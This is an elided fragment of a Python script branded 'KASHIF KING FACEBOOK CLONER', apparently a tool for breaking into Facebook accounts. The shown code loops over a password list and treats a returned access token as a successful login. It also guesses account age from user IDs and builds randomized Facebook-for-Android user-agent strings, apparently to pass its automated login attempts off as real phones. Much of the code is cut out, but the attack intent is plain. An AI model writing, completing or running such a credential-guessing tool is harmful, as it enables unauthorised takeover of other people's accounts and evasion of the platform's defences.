...
class KashifKingCloner:
    ...
    def banner(self):
        ...
        print(f"""{G}
   DEVELOPER : {Y}KASHIF KING{G}                  TOOLS     : {Y}KASHI KING FACEBOOK CLONER{G}
   VERSION   : {Y}v1.0{G}                         TITLE     : {Y}POWERED BY KASHIF KING
                  SECURE & FAST TOOL      {N}""")
        ...
        try:
            for pw in passlist:
                ...
                if "access_token" in response:
                    ...
                    year = self.get_year_from_uid(uid_logged)
    ...
    def get_year_from_uid(self, uid):
        uid = str(uid)
        if len(uid) == 15:
    ...
    def best_redmi_ua(self):
        ...
        w, h = m["res"]
        return (f"[FBAN/FB4A;FBAV/{random.randint(300, 450)}.0.0.{random.randint(1, 30)}.{random.randint(50, 150)};"
